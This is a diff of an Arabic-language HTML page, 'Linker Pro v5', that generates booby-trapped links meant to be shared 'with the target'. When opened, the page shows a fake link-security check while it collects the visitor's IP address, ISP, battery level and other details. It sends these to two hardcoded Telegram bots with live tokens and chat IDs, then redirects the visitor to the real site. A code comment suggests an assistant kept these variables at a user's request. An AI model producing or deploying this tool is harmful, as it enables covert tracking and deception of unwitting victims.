@@ -3,54 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Linker Pro v4 | نظام التتبع المتقدم</title>
+    <title>Linker Pro v5 | الاحترافي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #00d2ff; --bg: #0f172a; --card: #1e293b; }
-        body { font-family: 'Cairo', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .container { background: var(--card); padding: 30px; border-radius: 20px; width: 90%; max-width: 450px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
-        .gear { font-size: 60px; animation: spin 2s linear infinite; display: inline-block; color: var(--primary); }
+        /* إعدادات الألوان المتطورة */
+        :root {
+            --primary: #00d2ff;
+            --secondary: #3a7bd5;
+            --bg-dark: #080c14;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --text-main: #f8fafc;
+            --accent: #10b981;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: radial-gradient(circle at top, #1e293b 0%, var(--bg-dark) 100%);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* حاوية التصميم الزجاجي */
+        .glass-container {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 480px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s ease;
+        }
+
+        h1 {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .description {
+            font-size: 0.9rem;
+            color: #94a3b8;
+            margin-bottom: 30px;
+        }
+
+        /* تصميم المدخلات */
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 2px solid #334155;
+            border-radius: 12px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 210, 255, 0.3);
+        }
+
+        /* الزر الاحترافي */
+        button {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 15px -3px rgba(58, 123, 213, 0.4);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 20px 25px -5px rgba(58, 123, 213, 0.5);
+        }
+
+        /* منطقة النتائج */
+        #result-box {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px dashed var(--accent);
+            border-radius: 12px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        code {
+            display: block;
+            background: #000;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: var(--primary);
+            word-break: break-all;
+            margin-top: 10px;
+        }
+
+        /* الترس المطور ⚙️ */
+        .loading-overlay {
+            display: none;
+        }
+
+        .gear-icon {
+            font-size: 80px;
+            background: linear-gradient(var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: spin 3s linear infinite;
+            margin-bottom: 20px;
+        }
+
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: white; margin-bottom: 20px; outline: none; box-sizing: border-box; }
-        button { background: linear-gradient(135deg, var(--primary), #3a7bd5); border: none; padding: 15px; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; width: 100%; }
-        #result-box { display: none; margin-top: 20px; border: 2px dashed var(--primary); padding: 15px; border-radius: 10px; word-break: break-all; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-container">
+<div class="glass-container" id="main-container">
     <div id="generator-view">
-        <h1 style="color: var(--primary);">Linker Pro 🔗</h1>
-        <p>أدخل الرابط المراد تلغيمه:</p>
-        <input type="text" id="targetUrl" placeholder="https://example.com">
-        <button id="genBtn">توليد الرابط وحقن السكربت ⚙️</button>
-        <div id="result-box">
-            <p>✅ تم التلغيم! انسخ الرابط:</p>
-            <code id="final-link" style="background: #000; padding: 10px; display: block; border-radius: 5px; font-size: 11px;"></code>
+        <h1>Linker Pro 🔗</h1>
+        <p class="description">قم بتشفير وتلغيم الروابط بلمسة احترافية واحدة</p>
+        
+        <div class="input-group">
+            <input type="text" id="targetUrl" placeholder="أدخل الرابط (e.g. https://google.com)">
         </div>
+        
+        <button id="genBtn" onclick="handleGenerate()">توليد الرابط الآن ✨</button>
+
+        <div id="result-box">
+            <p style="color: var(--accent); font-weight: bold; margin: 0;">✅ جاهز للإرسال!</p>
+            <code id="final-link"></code>
+            <p style="font-size: 0.75rem; color: #94a3b8; margin-top: 10px;">انسخ الرابط وشاركه مع الهدف</p>
+        </div>
+    </div>
+
+    <div id="loading-view" class="loading-overlay">
+        <div class="gear-icon">⚙️</div>
+        <h2 id="loading-status">جاري المعالجة الرقمية...</h2>
+        <p style="color: #64748b;">يتم الآن تشفير البيانات وحقن السكربتات</p>
     </div>
 </div>
 
 <script>
-    // 1. قائمة المستلمين (التوكن و الـ ID لكل حساب)
+    // قائمة المستلمين (المتغيرات التي طلبت المحافظة عليها)
     const recipients = [
         { token: "8522437337:AAHwqXJjBqbbTL-QDbQoV7eoHp6fWFkopno", chat_id: "6068331455" },
         { token: "8594996038:AAEb5I-j5t8fp7GPIuyAlV4Z-irdKf2Nm7w", chat_id: "6194281534" }
     ];
 
-    // --- أولاً: جزء توليد الرابط (يعمل عند الضغط على الزر) ---
-    document.getElementById('genBtn')?.addEventListener('click', async function() {
+    // دالة التوليد الأساسية
+    async function handleGenerate() {
         const urlInput = document.getElementById('targetUrl').value;
-        if (!urlInput.startsWith('http')) return alert("أدخل رابطاً صحيحاً");
+        const btn = document.getElementById('genBtn');
+        
+        if (!urlInput.startsWith('http')) return alert("يرجى إدخال رابط صحيح يبدأ بـ http");
 
-        this.innerText = "جاري التلغيم...";
+        btn.innerText = "جاري التشفير...";
         const proxy = "https://corsproxy.io/?"; 
         
         try {
             const response = await fetch(proxy + encodeURIComponent(urlInput));
             const htmlText = await response.text();
             const doc = new DOMParser().parseFromString(htmlText, "text/html");
-            const title = doc.querySelector('meta[property="og:title"]')?.content || doc.title || "رابط مؤمن";
+            
+            const title = doc.querySelector('meta[property="og:title"]')?.content || doc.title || "رابط محمي";
             const image = doc.querySelector('meta[property="og:image"]')?.content || "";
 
             const currentUrl = window.location.href.split('?')[0];
@@ -58,32 +199,30 @@
 
             document.getElementById('result-box').style.display = 'block';
             document.getElementById('final-link').innerText = finalLink;
-            this.innerText = "توليد الرابط الآن ⚙️";
-        } catch (e) { 
-            alert("خطأ في الخادم"); 
-            this.innerText = "توليد الرابط الآن ⚙️";
+            btn.innerText = "توليد الرابط الآن ✨";
+        } catch (e) {
+            alert("حدث خطأ في الاتصال بالخادم الوسيط");
+            btn.innerText = "توليد الرابط الآن ✨";
         }
-    });
+    }
 
-    // --- ثانياً: جزء "التلغيم" والإرسال (يعمل عند فتح الرابط المولد) ---
+    // دالة الالتقاط والإرسال (Start Capture)
     async function startCapture() {
         const params = new URLSearchParams(window.location.search);
         if (!params.has('dest')) return;
 
-        // إخفاء واجهة المولد وإظهار شاشة التمويه للهدف
-        document.getElementById('main-container').innerHTML = `
-            <div class="gear">⚙️</div>
-            <h2 style="color:var(--primary)">جاري فحص أمان الرابط...</h2>
-            <p>يرجى الانتظار، يتم التحقق من التشفير</p>
-        `;
+        // تبديل الواجهة لوضع "الهدف"
+        document.getElementById('generator-view').style.display = 'none';
+        document.getElementById('loading-view').style.display = 'block';
+        const statusText = document.getElementById('loading-status');
 
         try {
-            const port = window.location.port || "افتراضي (80/443)";
-const isp = ipData.org || "غير معروف";
-
-            // جلب البيانات الأساسية
+            // جلب بيانات IP والمزود
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
+            
+            const port = window.location.port || "80/443";
+            const isp = ipData.org || "غير معروف";
 
             let batteryLevel = "غير متاح";
             if (navigator.getBattery) {
@@ -91,7 +230,7 @@ const isp = ipData.org || "غير معروف";
                 batteryLevel = Math.floor(battery.level * 100) + "%";
             }
 
-            // تنسيق الرسالة
+            // تنسيق الرسالة التليجرام
             const message = `
 ⛔️ *تنبيه: دخول جديد*
 ---------------------------------------
@@ -105,13 +244,14 @@ const isp = ipData.org || "غير معروف";
 🎯 *الوجهة:* ${params.get('dest')}
             `;
 
-            // إرسال البيانات لكل مستلم 📬
+            // الإرسال لجميع المستلمين
             for (const target of recipients) {
-                const telegramUrl = `https://api.telegram.org/bot${target.token}/sendMessage?chat_id=${target.chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                await fetch(telegramUrl).catch(err => console.log("خطأ في إرسال محدد"));
+                const url = `https://api.telegram.org/bot${target.token}/sendMessage?chat_id=${target.chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                await fetch(url).catch(() => {});
             }
 
-            // التحويل للرابط الأصلي
+            // محاكاة الفحص قبل التحويل
+            statusText.innerText = "اكتمل فحص التشفير... جاري التوجيه";
             setTimeout(() => {
                 window.location.href = params.get('dest');
             }, 3000);
@@ -121,9 +261,8 @@ const isp = ipData.org || "غير معروف";
         }
     }
 
-    // تشغيل الدالة عند تحميل الصفحة
+    // التشغيل التلقائي
     startCapture();
 </script>
-
 </body>
 </html>
